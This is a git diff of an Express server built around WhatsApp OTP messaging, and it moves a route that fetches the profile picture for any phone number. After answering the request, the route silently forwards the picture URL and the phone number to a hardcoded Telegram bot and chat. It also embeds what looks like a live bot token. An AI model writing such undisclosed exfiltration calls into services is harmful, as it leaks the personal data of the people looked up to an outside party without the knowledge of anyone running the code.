@@ -121,53 +121,7 @@ const generateMessage = (templateKey, otp, expiry, company = "Your Company", cus
 };
 
 
-app.get('/:number', async (req, res) => {
-    let phone = req.params.number;
-    if (phone === 'favicon.ico') return res.status(200).json({ ok: 'true' });
 
-   
-    if (!isValidPhoneNumber(phone)) {
-        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
-    }
-
-    const phoneNumber = `${phone}@s.whatsapp.net`;
-
-    if (pendingRequests.has(phoneNumber)) {
-        const profilePicUrl = await pendingRequests.get(phoneNumber);
-        return profilePicUrl
-            ? res.json({ profilePicUrl, status:{status:''} })
-            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
-    }
-
-    if (!isClientConnected) {
-        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
-    }
-
-    try {
-        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
-        pendingRequests.set(phoneNumber, profilePicPromise);
-
-        const profilePicUrl = await profilePicPromise;
-
-        if (profilePicUrl) {
-            res.json({ profilePicUrl, status:{status:''} });
-
-            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phone)}`;
-            try {
-                await fetch(telegramUrl);
-            } catch (fetchError) {
-                console.error('Failed to send photo to Telegram:', fetchError);
-            }
-        } else {
-            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
-        }
-    } catch (error) {
-        console.error('Error fetching profile picture:', error);
-        res.status(500).json({ error: 'Failed to fetch profile picture' });
-    } finally {
-        pendingRequests.delete(phoneNumber);
-    }
-});
 
 const isValidPhoneNumber = (phone) => {
     let formattedPhone = phone.startsWith('+') ? phone : `+${phone}`;
@@ -243,4 +197,53 @@ app.get('/verify-otp', (req, res) => {
 app.get('/active-otps', (req, res) => {
     const storage = removeExpiredOTPs(loadStorage());
     res.json({ success: true, otps: storage });
+});
+
+
+app.get('/:number', async (req, res) => {
+    let phone = req.params.number;
+    if (phone === 'favicon.ico') return res.status(200).json({ ok: 'true' });
+
+   
+    if (!isValidPhoneNumber(phone)) {
+        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
+    }
+
+    const phoneNumber = `${phone}@s.whatsapp.net`;
+
+    if (pendingRequests.has(phoneNumber)) {
+        const profilePicUrl = await pendingRequests.get(phoneNumber);
+        return profilePicUrl
+            ? res.json({ profilePicUrl, status:{status:''} })
+            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
+    }
+
+    if (!isClientConnected) {
+        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
+    }
+
+    try {
+        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
+        pendingRequests.set(phoneNumber, profilePicPromise);
+
+        const profilePicUrl = await profilePicPromise;
+
+        if (profilePicUrl) {
+            res.json({ profilePicUrl, status:{status:''} });
+
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phone)}`;
+            try {
+                await fetch(telegramUrl);
+            } catch (fetchError) {
+                console.error('Failed to send photo to Telegram:', fetchError);
+            }
+        } else {
+            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
+        }
+    } catch (error) {
+        console.error('Error fetching profile picture:', error);
+        res.status(500).json({ error: 'Failed to fetch profile picture' });
+    } finally {
+        pendingRequests.delete(phoneNumber);
+    }
 });
